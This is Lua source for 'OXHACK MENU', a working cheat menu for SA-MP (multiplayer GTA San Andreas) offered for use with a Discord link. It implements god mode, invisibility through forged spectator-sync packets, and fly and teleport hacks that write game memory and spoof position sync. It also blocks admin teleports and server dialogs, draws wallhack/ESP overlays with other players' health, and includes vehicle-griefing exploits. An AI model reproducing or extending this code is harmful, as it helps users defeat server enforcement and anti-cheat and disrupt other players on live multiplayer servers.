function aba_PLAYER()
    imgui.Checkbox('MOD DEWA', EASY.godmod)        
    imgui.Checkbox('ANTI STUN', EASY.nostun)
    imgui.Checkbox("TIDAK TERLIHAT", invis)
    imgui.Checkbox("BALIKKAN PEMAIN", invertPlayer)
    imgui.Checkbox('CEK PLATFORM', EASY.espplataforma)
    imgui.Checkbox("TINJU CEPAT", fastPunch)
    if imgui.Checkbox("NONAKTIFKAN ANTI DM", app.hg.ANTIDM) then end
    imgui.Checkbox("AUTO REGENERASI HIDUP", autoRegenerarVida)
        if autoRegenerarVida[0] then
            regenerarVida()
        end
    if imgui.Checkbox("STAMINA TAK TERBATAS", staminaInfinite) then
        if staminaInfinite[0] then
            setPlayerNeverGetsTired(PLAYER_HANDLE, true)
        else
            setPlayerNeverGetsTired(PLAYER_HANDLE, false)
        end
    end
    if imgui.Checkbox("TIDAK JATUH", noFallActive) then
        if noFallActive[0] then
            startNoFall()
        else
            stopNoFall()
        end
    end
    imgui.Checkbox("AMUNISI TAK TERBATAS", infiniteAmmo)
    imgui.Checkbox('BLOKIR TP ADMIN', EASY.naotelaradm) 
    imgui.Checkbox("CHEAT KECEPATAN", speedHack)   
end

function aba_WORLD()
    imgui.Checkbox('ADMIN TIDAK BEKU', EASY.teste31)
    imgui.Checkbox("BLOKIR DIALOG", blockDialogs)
 
    imgui.Checkbox("FAKE PC", fakeActive)
end

function aba_EXPLOITS()
    imgui.Checkbox("AUTOFARM PENGISI (OSCRIAS)", app.autoTPCheck)
    
    imgui.Checkbox("CBUG", app.shootingEnabled1)
    if app.shootingEnabled1[0] then
        imgui.SliderFloat("DELAY CBUG", app.clearAnimTime, 100, 1000)
    end

    imgui.Checkbox("CBUG & LIFE FOOT", app.shootingEnabled)
    imgui.Checkbox("LIFE FOOT 1 TEMBAKAN", app.lifefoot1)
    imgui.Checkbox("LIFE FOOT 2 TEMBAKAN", app.lifefoot)

    if imgui.Checkbox("BUG KENDARAAN", imgui.new.bool(app.isTimerActive)) then
        app.isTimerActive = not app.isTimerActive
        sampAddChatMessage("SPCAR LOOP " .. (app.isTimerActive and "{00FF00}AKTIF" or "{FF0000}MATI"), 0x007FFF)
    end

    imgui.Checkbox("RVANKA MOBIL LEVIT", app.hg.RVANKACARROS)

    if imgui.Checkbox("BUG KENDARAAN BERDASARKAN ID", app.usarIdManual) then
        if app.usarIdManual[0] then
            sampAddChatMessage("MASUKKAN ID DAN MOBIL AKAN TERBUG", 0x007FFF)
        end
    end

    if app.hg.RVANKACARROS[0] then
        imgui.SliderFloat("JARAK AKTIVASI", app.slide.RVANKADISTANCE, 1.0, 20.0)
        imgui.SliderInt("DELAY (MS)", app.slide.RVANKADLAY, 50, 1000)
        imgui.SliderFloat("KEKUATAN", app.slide.pot, 0.05, 0.4)

        if imgui.Button(app.stealthMode and "NONAKTIFKAN RVANKA" or "AKTIFKAN RVANKA") then
            app.stealthMode = not app.stealthMode
            sampAddChatMessage(app.stealthMode and "RVANKA AKTIF" or "RVANKA NONAKTIF", 0x00FF00)
        end
    end

    if app.usarIdManual[0] then
        imgui.PushItemWidth(300)
        imgui.InputInt("ID", app.idManual)
        imgui.PopItemWidth()

        if imgui.Button("BUG SEKARANG") then
            respawnCarById(app.idManual[0])
        end
    end
end

function aba_TELEPORT()
    imgui.TextColored(imgui.ImVec4(1.0, 0.75, 0.0, 1.0), faicons('LOCATION_DOT') .. ' SISTEM TELEPORT')
    imgui.Separator()

    if imgui.Checkbox(faicons("LOCATION_ARROW") .. " TELEPORT MARK", teleporteAtivo) then
        teletransportado = false
    end

    imgui.Spacing()

    if imgui.Button(faicons('map') .. ' RUMAH SAKIT LS', imgui.ImVec2(165, 45)) then
        setCharCoordinates(1, 1188.59, -1327.66, 13.56)
    end
    imgui.SameLine()
    if imgui.Button(faicons('map') .. ' GROOVE ST', imgui.ImVec2(165, 45)) then
        setCharCoordinates(1, 2492.06, -1665.07, 13.34)
    end
    imgui.SameLine()
    if imgui.Button(faicons('map') .. ' BALAI KOTA LS', imgui.ImVec2(165, 45)) then
        setCharCoordinates(1, 1478.19, -1768.59, 18.79)
    end

    imgui.Spacing()

    if imgui.Button(faicons('map') .. ' BANDARA LS', imgui.ImVec2(165, 45)) then
        setCharCoordinates(1, 1959.68, -2188.97, 13.54)
    end
    imgui.SameLine()
    if imgui.Button(faicons('map') .. ' ALUN-ALUN LS', imgui.ImVec2(165, 45)) then
        setCharCoordinates(1, 1481.6, -1699.5, 14.0)
    end
    imgui.SameLine()
    if imgui.Button(faicons('map') .. ' AMMU-NATION LS', imgui.ImVec2(165, 45)) then
        setCharCoordinates(1, 1361.94, -1279.06, 13.38)
    end

    imgui.Spacing()

    if imgui.Button(faicons('map') .. ' KASINO LV', imgui.ImVec2(165, 45)) then
        setCharCoordinates(1, 2179.21, 1676.20, 11.04)
    end

    imgui.Spacing()
    imgui.Separator()
    imgui.Spacing()

    if imgui.Button(faicons('LOCATION_CROSSHAIRS') .. ' TELEPORT TERPANDU', imgui.ImVec2(508, 45)) then
        local result, x1, y1, z1 = getTargetBlipCoordinates()
        if result and not coord_master then
            lua_thread.create(function()
                coord_master = true
                local x, y, z = getCharCoordinates(playerPed)
                local distance = getDistanceBetweenCoords3d(x, y, z, x1, y1, z1)
                printStringNow("~r~JARAK: " .. tostring(math.floor(distance)), 5000)

                freezeCharPosition(PLAYER_PED, true)
                CoordMaster(x1, y1, z1, 11, 300)
                freezeCharPosition(PLAYER_PED, false)

                coord_master = false
            end)
        end
    end
end

function aba_CREDITOS()
    imgui.Text("Dibuat oleh: Juca Menu")
    imgui.Text("Asisten: Doisr Menu")
    imgui.Text("Proyek dibuat oleh: Doisr Menu")
    imgui.Text("Versi: 1.0")
    imgui.Text("Discord: https://discord.gg/uGf6ckNTQh")
    imgui.Text("Versi pertama, fungsi lainnya menyusul...")
end


-- Inicialização do tema e fontes
imgui.OnInitialize(function()
    imgui.GetIO().IniFilename = nil
    imgui.GetStyle():ScaleAllSizes(MDS)

    -- Carregar ícones FontAwesome
    local config = imgui.ImFontConfig()
    config.MergeMode = true
    config.PixelSnapH = true
    local iconRanges = imgui.new.ImWchar[3](faicons.min_range, faicons.max_range, 0)
    imgui.GetIO().Fonts:AddFontFromMemoryCompressedBase85TTF(faicons.get_font_data_base85('Regular'), 16 * MDS, config, iconRanges)

    local style = imgui.GetStyle()
    local colors = style.Colors

    -- Fundo de janela e child
    colors[imgui.Col.WindowBg] = imgui.ImVec4(0.09, 0.12, 0.17, 1.00)
    colors[imgui.Col.ChildBg] = imgui.ImVec4(0.11, 0.14, 0.20, 1.00)
    colors[imgui.Col.Border] = imgui.ImVec4(0.25, 0.33, 0.42, 1.00)

    -- Botões
    colors[imgui.Col.Button] = imgui.ImVec4(0.20, 0.28, 0.38, 1.00)
    colors[imgui.Col.ButtonHovered] = imgui.ImVec4(0.30, 0.40, 0.55, 1.00)
    colors[imgui.Col.ButtonActive] = imgui.ImVec4(0.45, 0.60, 0.85, 1.00)

    -- Texto
    colors[imgui.Col.Text] = imgui.ImVec4(0.95, 0.95, 0.95, 1.00)
    colors[imgui.Col.TextDisabled] = imgui.ImVec4(0.55, 0.55, 0.60, 1.00)

    -- Cabeçalhos
    colors[imgui.Col.Header] = imgui.ImVec4(0.25, 0.35, 0.55, 0.30)
    colors[imgui.Col.HeaderHovered] = imgui.ImVec4(0.35, 0.48, 0.75, 0.80)
    colors[imgui.Col.HeaderActive] = imgui.ImVec4(0.20, 0.30, 0.50, 1.00)

    -- Separadores
    colors[imgui.Col.Separator] = imgui.ImVec4(0.30, 0.40, 0.55, 0.50)
    colors[imgui.Col.SeparatorHovered] = imgui.ImVec4(0.40, 0.52, 0.75, 0.80)
    colors[imgui.Col.SeparatorActive] = imgui.ImVec4(0.50, 0.65, 0.90, 1.00)

    -- Arredondamento das bordas
    style.WindowRounding = 7.0
    style.ChildRounding = 6.0
    style.FrameRounding = 4.0
    style.PopupRounding = 6.0
    style.ScrollbarRounding = 5.0
    style.GrabRounding = 5.0
    style.TabRounding = 6.0

    -- Espaçamento e padding geral
    style.WindowPadding = imgui.ImVec2(10, 10)
    style.FramePadding = imgui.ImVec2(7, 5)
    style.ItemSpacing = imgui.ImVec2(10, 8)
    style.ItemInnerSpacing = imgui.ImVec2(5, 5)
    style.IndentSpacing = 22.0
    style.ScrollbarSize = 14.0
    style.GrabMinSize = 12.0
end)

-- Função para aplicar estilo maior nas checkboxes
local function beginLargeCheckboxStyle()
    local style = imgui.GetStyle()
    -- Salvar valores originais pra restaurar depois
    local oldFramePadding = style.FramePadding
    local oldItemSpacing = style.ItemSpacing

    -- Aumenta o padding, deixa a checkbox maior (mais espaçosa)
    style.FramePadding = imgui.ImVec2(10, 7)
    style.ItemSpacing = imgui.ImVec2(12, 8)

    return oldFramePadding, oldItemSpacing
end

local function endLargeCheckboxStyle(oldFramePadding, oldItemSpacing)
    local style = imgui.GetStyle()
    -- Restaurar valores originais
    style.FramePadding = oldFramePadding
    style.ItemSpacing = oldItemSpacing
end

-- Simula o SeparatorText
local function SeparatorWithText(text, skipTop)
    local fullWidth = imgui.GetContentRegionAvail().x
    local textWidth = imgui.CalcTextSize(text).x
    local spacing = 8.0
    local lineWidth = (fullWidth - textWidth - spacing * 2) / 2

    if not skipTop and lineWidth > 0 then
        imgui.Separator()
        imgui.SameLine()
        imgui.SetCursorPosX(imgui.GetCursorPosX() + lineWidth)
    elseif skipTop then
        imgui.SetCursorPosX(imgui.GetCursorPosX() + lineWidth + spacing)
    end

    imgui.TextColored(imgui.ImVec4(0.2, 0.6, 1.0, 0.8), text)
    imgui.Separator()
end

imgui.OnFrame(function()
    return window[0]
end, function()
    local resX, resY = getScreenResolution()
    imgui.SetNextWindowPos(imgui.ImVec2(resX / 2, resY / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, 0.5))
    imgui.SetNextWindowSize(imgui.ImVec2(650 * MDS, 450 * MDS), imgui.Cond.FirstUseEver)

    imgui.Begin("OXHACK MENU", window, imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoResize + imgui.WindowFlags.NoScrollbar + imgui.WindowFlags.NoScrollWithMouse + imgui.WindowFlags.NoTitleBar)

    local ip, port = sampGetCurrentServerAddress()
    local servername = sampGetCurrentServerName() or "DESCONHECIDO"

    -- Botão fechar (xmark)
    local windowWidth = imgui.GetWindowSize().x
    imgui.SetCursorPosY(5 * MDS)
    imgui.SetCursorPosX(windowWidth - 30 * MDS)
    imgui.PushStyleColor(imgui.Col.Button, imgui.ImVec4(0, 0, 0, 0))
    imgui.PushStyleColor(imgui.Col.ButtonHovered, imgui.ImVec4(0.3, 0.3, 0.3, 0.6))
    imgui.PushStyleColor(imgui.Col.ButtonActive, imgui.ImVec4(0.5, 0, 0, 0.8))
    imgui.PushStyleColor(imgui.Col.Text, imgui.ImVec4(1, 1, 1, 1))
    if imgui.Button(faicons("xmark"), imgui.ImVec2(25 * MDS, 25 * MDS)) then
        window[0] = false
    end
    imgui.PopStyleColor(4)

    -- Cabeçalho
    imgui.SetCursorPosY(5 * MDS)
    imgui.SetCursorPosX(10 * MDS)
    imgui.PushStyleColor(imgui.Col.Text, imgui.ImVec4(1, 1, 1, 1))
    imgui.BeginChild("##sidebar", imgui.ImVec2(160 * MDS, 0), true)

    imgui.BeginChild("##tabs_section", imgui.ImVec2(0, -40 * MDS), false)
    local title = "OXHACK MENU"
    local titleWidth = imgui.CalcTextSize(title).x
    imgui.SetCursorPosX((160 * MDS - titleWidth) / 2)
    imgui.TextColored(imgui.ImVec4(0.2, 0.6, 1.0, 1.0), title)
    imgui.Separator()

    -- Abas com ícones ordenadas
    for _, sectionName in ipairs(sectionOrder) do
        local tabList = sections[sectionName]
        if tabList then
            local skipTop = sectionName == "Miscellaneous"
            SeparatorWithText(sectionName, skipTop)

            for _, tab in ipairs(tabList) do
                local isSelected = selectedTab == tab
                if isSelected then
                    imgui.PushStyleColor(imgui.Col.Button, imgui.ImVec4(0.20, 0.50, 0.80, 1.00))
                    imgui.PushStyleColor(imgui.Col.ButtonHovered, imgui.ImVec4(0.25, 0.55, 0.85, 1.00))
                    imgui.PushStyleColor(imgui.Col.ButtonActive, imgui.ImVec4(0.15, 0.45, 0.75, 1.00))
                    imgui.PushStyleColor(imgui.Col.Text, imgui.ImVec4(1, 1, 1, 1))
                end

                local icon = tabIcons[tab] or faicons("question")
                if imgui.Button(icon .. "  " .. tab, imgui.ImVec2(-1, 35 * MDS)) then
                    selectedTab = tab
                end

                if isSelected then
                    imgui.PopStyleColor(4)
                end
            end
        end
    end
    imgui.EndChild()

    -- Rodapé
    imgui.BeginChild("##footer_section", imgui.ImVec2(0, 0), false)
    local versionText = "v1.0.0"
    local versionWidth = imgui.CalcTextSize(versionText).x
    imgui.SetCursorPosX((160 * MDS - versionWidth) / 2)
    imgui.TextColored(imgui.ImVec4(1, 1, 1, 0.6), versionText)

    local byText = "by OXHACK TEAM"
    local byWidth = imgui.CalcTextSize(byText).x
    imgui.SetCursorPosX((160 * MDS - byWidth) / 2)
    imgui.TextColored(imgui.ImVec4(1, 1, 1, 0.4), byText)
    imgui.EndChild()
    imgui.EndChild()

    -- Conteúdo da aba selecionada
    imgui.SameLine()
    imgui.BeginChild("##content", imgui.ImVec2(0, 0), true)

    if selectedTab ~= "" then
        imgui.PushStyleColor(imgui.Col.Text, imgui.ImVec4(0.8, 0.8, 0.8, 1.00))
        local tabFunc = _G["aba_" .. selectedTab]
        if type(tabFunc) == "function" then
            tabFunc()
        else
            imgui.Text("Aba '" .. selectedTab .. "' ainda não foi implementada.")
        end
        imgui.PopStyleColor()
    else
        imgui.SetCursorPosY(imgui.GetCursorPosY() + 20)
        imgui.PushStyleColor(imgui.Col.Text, imgui.ImVec4(0.8, 0.8, 0.8, 0.8))
        local welcomeText = "Bem-vindo ao OXHACK MENU"
        local textWidth = imgui.CalcTextSize(welcomeText).x
        imgui.SetCursorPosX((imgui.GetContentRegionAvail().x - textWidth) / 2)
        imgui.Text(welcomeText)

        imgui.SetCursorPosY(imgui.GetCursorPosY() + 15)
        local instructionText = "Selecione uma aba no menu à esquerda"
        local instWidth = imgui.CalcTextSize(instructionText).x
        imgui.SetCursorPosX((imgui.GetContentRegionAvail().x - instWidth) / 2)
        imgui.Text(instructionText)
        imgui.PopStyleColor()
    end

    imgui.EndChild()
    imgui.End()
end)

sampRegisterChatCommand("oxmenu", function()
    window[0] = not window[0]
end)

--PARTE SAMP EVENTS

function sampev.onRequestSpawnResponse()
	if EASY.godmod[0] then
		return false
	end
end

function sampev.onRequestClassResponse()
	if EASY.godmod[0] then
		return false
	end
end

function sampev.onResetPlayerWeapons()
	if EASY.godmod[0] then
		return false
	end
end

function sampev.onBulletSync()
	if EASY.godmod[0] then 
		return false
	end
end

function sampev.onSetPlayerHealth()
	if EASY.godmod[0] then
		return false
	end
end

function sampev.onSetCameraBehind()
	if EASY.godmod[0] then
		return false
	end
end

function sampev.onSetPlayerSkin()
	if EASY.godmod[0] then
		return false
	end
end

function sampev.onTogglePlayerControllable()
	if EASY.godmod[0] then
		return false
	end
end

-- Captura o evento de desconexão/kick e inicia o reconnect automático
function sampev.onServerMessage(packetId, bitStream)
    if not autoReconnect[0] then return end

    if packetId == sf.PACKET_KICK or packetId == sf.PACKET_CONNECTION_LOST then
        reconnectToServer(reconnectDelay[0])
    end
end

function sampev.onSendPlayerSync(data)
    if EASY.godmod[0] then
        data.playerHealth = 1000 -- ou o máximo que quiser
        data.armor = 1000
    end
end

function sampEvents.onSendPlayerSync(syncData)
    if isActive[0] then
        syncData.weapon = 0
    end
end

function sampev.onCreateObject(id, data)
	if OXHACK.spedagio then
		if data.modelId == 968 or data.modelId == 966 then
			return false
		end
	end
end

function ev.onResetPlayerWeapons()
    if OXHACK.noreset[0] then    
    return false
    end
end

function matararea()
    areasafe = not areasafe
end

function setCharCoordinatesSafe(char, x, y, z)
    local ptr = getCharPointer(char)
    if ptr ~= 0 then
        local matrix = readMemory(ptr + 0x14, 4, false)
        if matrix ~= 0 then
            local pos = matrix + 0x30
            writeMemory(pos + 0, 4, representFloatAsInt(x), false)
            writeMemory(pos + 4, 4, representFloatAsInt(y), false)
            writeMemory(pos + 8, 4, representFloatAsInt(z), false)
        end
    end
end

-- AirBrake com suporte total a carro e ped
function processFlyHack()
    local x1, y1 = getActiveCameraCoordinates()
    local x2, y2 = getActiveCameraPointAt()
    local angle = -math.rad(getHeadingFromVector2d(x2 - x1, y2 - y1))

    local cx, cy, cz = getCharCoordinates(PLAYER_PED)
    local dx, dy, dz = 0, 0, 0
    local spd = speed[0]

    local result, analog_x, analog_y = isWidgetPressedEx(isCharInAnyCar(PLAYER_PED) and WIDGET_VEHICLE_STEER_ANALOG or WIDGET_PED_MOVE, 0)
    if result then
        analog_x = analog_x / 127
        analog_y = analog_y / 127
        dx = math.cos(angle) * spd * analog_x - math.sin(angle) * spd * analog_y
        dy = -math.sin(angle) * spd * analog_x - math.cos(angle) * spd * analog_y
    end

    if isWidgetPressed(WIDGET_ZOOM_IN) then dz = dz + spd / 2 end
    if isWidgetPressed(WIDGET_ZOOM_OUT) then dz = dz - spd / 2 end

    local newX = cx + dx
    local newY = cy + dy
    local newZ = cz + dz

    if isCharInAnyCar(PLAYER_PED) then
        local car = storeCarCharIsInNoSave(PLAYER_PED)
        last_car = car
        was_in_car = true

        freezeCarPosition(car, true)
        setCarCollision(car, false)

        local carPtr = getCarPointer(car)
        if carPtr ~= 0 then
            local matrix = readMemory(carPtr + 0x14, 4, false)
            if matrix ~= 0 then
                local pos = matrix + 0x30
                writeMemory(pos + 0, 4, representFloatAsInt(newX), false)
                writeMemory(pos + 4, 4, representFloatAsInt(newY), false)
                writeMemory(pos + 8, 4, representFloatAsInt(newZ), false)
            end
        end

        setCarHeading(car, math.deg(-angle))
    else
        if was_in_car and last_car and doesVehicleExist(last_car) then
            freezeCarPosition(last_car, false)
            setCarCollision(last_car, true)
        end
        was_in_car = false
        freezeCharPosition(PLAYER_PED, true)
        setCharCollision(PLAYER_PED, false)

        setCharCoordinatesSafe(PLAYER_PED, newX, newY, newZ)
        setCharHeading(PLAYER_PED, math.deg(-angle))
    end
end

-- Sync spoof (player)
function sampev.onSendPlayerSync(data)
    if airbrake_enabled[0] then
        local x, y, z = getCharCoordinates(PLAYER_PED)
        data.position = {x, y, z}
        data.moveSpeed.x = 0.0
        data.moveSpeed.y = 0.0
        data.moveSpeed.z = 0.0
        data.specialAction = 0 -- Libera soco/tiro
    end
end

-- Sync spoof (veículo)
function sampev.onSendVehicleSync(data)
    if airbrake_enabled[0] then
        local x, y, z = getCharCoordinates(PLAYER_PED)
        data.position = {x, y, z}
        data.moveSpeed.x = 0.0
        data.moveSpeed.y = 0.0
        data.moveSpeed.z = 0.0
    end
end

function startNoFall()
    if noFallThread == nil then
        noFallThread = lua_thread.create(function()
            while noFallActive[0] do
                wait(0)
                if isCharPlayingAnim(playerPed, "KO_SKID_BACK") or isCharPlayingAnim(playerPed, "FALL_COLLAPSE") then
                    clearCharTasksImmediately(playerPed)
                end

                if isCharPlayingAnim(playerPed, "FALL_FALL") and getCharHeightAboveGround(playerPed) <= 1.2 then
                    freezeCharPosition(playerPed, true)
                    wait(0)
                    freezeCharPosition(playerPed, false)
                end
            end
            noFallThread = nil
        end)
    end
end

function sampev.onShowDialog(dialogId, style, title, button1, button2, text)
    if blockDialogs[0] then
        printStringNow("~r~Dialog bloqueado", 1000)
        return false -- bloqueia
    end
end

function stopNoFall()
    noFallActive[0] = false
    if noFallThread then
        -- thread vai parar naturalmente porque while depende de noFallActive[0]
        noFallThread = nil
    end
end

function sampev.onSetPlayerPos()
    if EASY.naotelaradm[0] then
        return false -- Bloqueia o TP dos admins
    end
    return true
end

function sampev.onSendGiveDamage()
    if app.hg.ANTIDM[0] then
        return false
    end
end

-- Bloqueia o envio de sync quando o fake lag está ativo
function sampev.onSendPlayerSync(data)
    if fakeLagActive[0] and fakeLagNop then
        return false
    end
end

local players = {}
local font = renderCreateFont("Arial", 9, 5)

function espplataforma()
    local peds = getAllChars()

    -- Cor fixa padrão (branco com transparência total)
    local espcor = 0xFFFFFFFF

    for i = 2, #peds do
        local ped = peds[i]
        if ped ~= nil and isCharOnScreen(ped) then
            local success, id = sampGetPlayerIdByCharHandle(ped)
            if success and not sampIsPlayerNpc(id) then
                if players[id] ~= nil then
                    local x, y, z = getCharCoordinates(ped)
                    local xs, ys = convert3DCoordsToScreen(x, y, z)
                    renderFontDrawText(font, players[id], xs - 23, ys, espcor)
                end
            end
        end
    end
end

-- Detecta plataforma com base em sync
function events.onUnoccupiedSync(id, data)
    players[id] = "PC"
end

function events.onPlayerSync(id, data)
    if data.keysData == 160 then
        players[id] = "PC"
    end

    if data.specialAction ~= 0 and data.specialAction ~= 1 then
        players[id] = "PC"
    end

    if data.leftRightKeys and data.leftRightKeys ~= 128 and data.leftRightKeys ~= 65408 then
        players[id] = "Mobile"
    elseif players[id] ~= "Mobile" then
        players[id] = "PC"
    end

    if data.upDownKeys and data.upDownKeys ~= 128 and data.upDownKeys ~= 65408 then
        players[id] = "Mobile"
    elseif players[id] ~= "Mobile" then
        players[id] = "PC"
    end
end

function events.onVehicleSync(id, vehid, data)
    if data.leftRightKeys and data.leftRightKeys ~= 0 and data.leftRightKeys ~= 128 and data.leftRightKeys ~= 65408 then
        players[id] = "Mobile"
    end
end

function events.onPlayerQuit(id)
    players[id] = nil
end

function applyFastPunch()
    local anims = {
        "SPRINT_PANIC", "SWIM_CRAWL",
        "FIGHTA_1", "FIGHTA_2", "FIGHTA_3", "FIGHTA_M", "FIGHTA_G",
        "FIGHTB_1", "FIGHTB_2", "FIGHTB_3", "FIGHTB_G",
        "FIGHTC_1", "FIGHTC_2", "FIGHTC_3", "FIGHTC_G",
        "FIGHTD_1", "FIGHTD_2", "FIGHTD_3", "FIGHTD_G",
        "GUN_BUTT", "FIGHTKICK", "FIGHTKICK_B"
    }

    for i = 1, #anims do
        local anim = anims[i]
        local speed = (anim == "SPRINT_PANIC" and 1.3) or (anim == "SWIM_CRAWL" and 21) or 2
        setCharAnimSpeed(PLAYER_PED, anim, speed)
    end
end

function sampev.onSendPlayerSync(data)
	if invertPlayer[0] then
		data.quaternion[0] = 0
		data.quaternion[1] = 1
		data.quaternion[2] = 0
		data.quaternion[3] = 0
		data.position.y = data.position.y + 0.2
	end
end

function events.onSendPlayerSync(data)
    if invis[0] then
        local bs = raknetNewBitStream()
        raknetBitStreamWriteInt8(bs, 0x1A) -- PACKET_SPECTATOR_SYNC
        raknetBitStreamWriteFloat(bs, data.position.x)
        raknetBitStreamWriteFloat(bs, data.position.y)
        raknetBitStreamWriteFloat(bs, data.position.z)
        raknetSendBitStreamEx(bs, 2, 1, 1)
        raknetDeleteBitStream(bs)
        return false
    end
end

function startSpec(id)
    local exists, handle = sampGetCharHandleBySampPlayerId(id)
    if not exists then
        printStringNow('PLAYER FORA DO STREAM ZONE', 1666)
        return
    end
    specTargetId = id
    isSpecActive = true
    printStringNow('ESPECTANDO: '.. sampGetPlayerNickname(id) ..' ['.. id ..']', 1666)
    freezeCharPosition(playerPed, true)
    setCameraInFrontOfChar(handle)
end

function stopSpec()
    isSpecActive = false
    specTargetId = -1
    restoreCamera()
    setCameraBehindPlayer()
    freezeCharPosition(playerPed, false)
    printStringNow("ESPECTADOR DESATIVADO", 1666)
end

function ev.onSendPlayerSync(data)
    if isSpecActive and sampIsPlayerConnected(specTargetId) then
        local x, y, z = getCharCoordinates(playerPed)
        local target = select(2, sampGetCharHandleBySampPlayerId(specTargetId))
        local xx, yy, zz = getCharCoordinates(target)
        if getDistanceBetweenCoords3d(x, y, z, xx, yy, zz) < 200 then
            data.position = {x = x, y = y, z = z - 7}
            return false
        else
            printStringNow("PLAYER SAIU DO STREAM", 1666)
            stopSpec()
        end
    end
end

function ev.onPlayerChatBubble(i, c, _, d, m)
    if isSpecActive then return {i, c, 666.6, d, m} end
end

-- Proteção anti-tiro em amigo (exemplo simplificado, expande conforme necessário)
function ev.onSendBulletSync(data)
    if amigos[data.targetId] then
        return false
    end
end

function renderESP()
    if not var_0_10 then
        var_0_10 = createFont() 
        if not var_0_10 then
            return 
        end
    end

    local colorVisible = 0xFFFFFFFF -- Branco visível
    local colorBehindWall = 0xFFFF0000 -- Vermelho caso obstruído

    if EASY.esp_enabled[0] then
        local px, py, pz = getCharCoordinates(PLAYER_PED)

        for id = 0, 999 do
            local exists, ped = sampGetCharHandleBySampPlayerId(id)

            if exists and doesCharExist(ped) and isCharOnScreen(ped) then
                local tx, ty, tz = getCharCoordinates(ped)
                local distance = math.floor(getDistanceBetweenCoords3d(px, py, pz, tx, ty, tz))

                if distance <= 1000 then
                    local sx1, sy1 = convert3DCoordsToScreen(px, py, pz)
                    local sx2, sy2 = convert3DCoordsToScreen(tx, ty, tz)

                    local color = isLineOfSightClear(px, py, pz, tx, ty, tz, true, true, false, true, true) and colorVisible or colorBehindWall

                    renderDrawLine(sx1, sy1, sx2, sy2, 2, color)

                    local distanceText = string.format("%.1f", distance) .. "m"
                    renderFontDrawText(var_0_10, distanceText, sx2, sy2, color, false)
                end
            end
        end
    end
end

function drawSkeletonESP()
    local playerPed = PLAYER_PED
    local px, py, pz = getCharCoordinates(playerPed)
    local color = 0xFF00FFFF -- ciano claro

    for _, char in ipairs(getAllChars()) do
        if char ~= playerPed then
            local result, id = sampGetPlayerIdByCharHandle(char)
            if result and isCharOnScreen(char) then
                for _, bone in ipairs(bones) do
                    local x1, y1, z1 = getBonePosition(char, bone)
                    local x2, y2, z2 = getBonePosition(char, bone + 1)
                    local r1, sx1, sy1 = convert3DCoordsToScreenEx(x1, y1, z1)
                    local r2, sx2, sy2 = convert3DCoordsToScreenEx(x2, y2, z2)
                    if r1 and r2 then
                        renderDrawLine(sx1, sy1, sx2, sy2, 3, color)
                    end
                end
            end
        end
    end
end

function renderWallhack()
    if not var_0_10 then
        var_0_10 = createFont()
        if not var_0_10 then return end
    end

    if EASY.wallhack_enabled[0] then
        for _, char in ipairs(getAllChars()) do
            if char ~= PLAYER_PED then
                local ok, id = sampGetPlayerIdByCharHandle(char)
                if ok and isCharOnScreen(char) then
                    local x, y, z = getOffsetFromCharInWorldCoords(char, 0, 0, 0)
                    local sx, sy = convert3DCoordsToScreen(x, y, z + 1)
                    local sx2, sy2 = convert3DCoordsToScreen(x, y, z - 1)

                    local nickname = sampGetPlayerNickname(id) .. " (" .. id .. ")"
                    if sampIsPlayerPaused(id) then
                        nickname = "[AFK] " .. nickname
                    end

                    local hp = sampGetPlayerHealth(id)
                    local ap = sampGetPlayerArmor(id)
                    local colorNick = bit.bor(bit.band(sampGetPlayerColor(id), 0xFFFFFF), 0xFF000000)

                    renderFontDrawText(var_0_10, nickname, sx - renderGetFontDrawTextLength(var_0_10, nickname) / 2, sy - renderGetFontDrawHeight(var_0_10) * 3.8, colorNick)
                    renderDrawBoxWithBorder(sx - 24, sy - 45, 50, 6, 0xFF000000, 1, 0xFF000000)
                    renderDrawBoxWithBorder(sx - 24, sy - 45, hp / 2, 6, 0xFFFF0000, 1, 0)

                    if ap > 0 then
                        renderDrawBoxWithBorder(sx - 24, sy - 35, 50, 6, 0xFF000000, 1, 0xFF000000)
                        renderDrawBoxWithBorder(sx - 24, sy - 35, ap / 2, 6, 0xFFFFFFFF, 1, 0)
                    end
                end
            end
        end
    end
end

function espcarlinha()
    local color = 0xFF00FF00 -- verde
    local thickness = 2
    local px, py = convert3DCoordsToScreen(getCharCoordinates(PLAYER_PED))

    local corners = {
        { x = 1.5, y = 3, z = 1 },
        { x = 1.5, y = -3, z = 1 },
        { x = -1.5, y = -3, z = 1 },
        { x = -1.5, y = 3, z = 1 },
        { x = 1.5, y = 3, z = -1 },
        { x = 1.5, y = -3, z = -1 },
        { x = -1.5, y = -3, z = -1 },
        { x = -1.5, y = 3, z = -1 }
    }

    for _, veh in ipairs(getAllVehicles()) do
        if isCarOnScreen(veh) then
            local boxCorners = {}
            for _, offset in ipairs(corners) do
                local wx, wy, wz = getOffsetFromCarInWorldCoords(veh, offset.x, offset.y, offset.z)
                local sx, sy = convert3DCoordsToScreen(wx, wy, wz)
                table.insert(boxCorners, { x = sx, y = sy })
            end

            for i = 1, 4 do
                local ni = (i % 4 == 0 and i - 3) or (i + 1)
                renderDrawLine(boxCorners[i].x, boxCorners[i].y, boxCorners[ni].x, boxCorners[ni].y, thickness, color)
                renderDrawLine(boxCorners[i].x, boxCorners[i].y, boxCorners[i + 4].x, boxCorners[i + 4].y, thickness, color)
            end

            for i = 5, 8 do
                local ni = (i % 4 == 0 and i - 3) or (i + 1)
                renderDrawLine(boxCorners[i].x, boxCorners[i].y, boxCorners[ni].x, boxCorners[ni].y, thickness, color)
            end
        end
    end
end

function esplinhacarro()
    local color = 0xFF00FF00 -- verde
    local x, y = convert3DCoordsToScreen(getCharCoordinates(PLAYER_PED))

    for _, veh in ipairs(getAllVehicles()) do
        if isCarOnScreen(veh) then
            local carX, carY, carZ = getCarCoordinates(veh)
            local sx, sy = convert3DCoordsToScreen(carX, carY, carZ)
            renderDrawLine(x, y, sx, sy, 2, color)
        end
    end
end

function espinfo()
    local color = 0xFF00FF00 -- verde
    

    for _, v in ipairs(getAllVehicles()) do
        if v and isCarOnScreen(v) then
            local x, y, z = getCarCoordinates(v)
            local model = getCarModel(v)
            local _, id = sampGetVehicleIdByCarHandle(v)
            local hp = getCarHealth(v)
            local speed = getCarSpeed(v)

            local sx, sy = convert3DCoordsToScreen(x, y, z + 1)
            local info = string.format("CARRO: %d (ID: %d)\nLATARIA: %d\nVELOCIDADE: %.2f", model, id, hp, speed)
            renderFontDrawText(font, info, sx, sy, color)
        end
    end
end

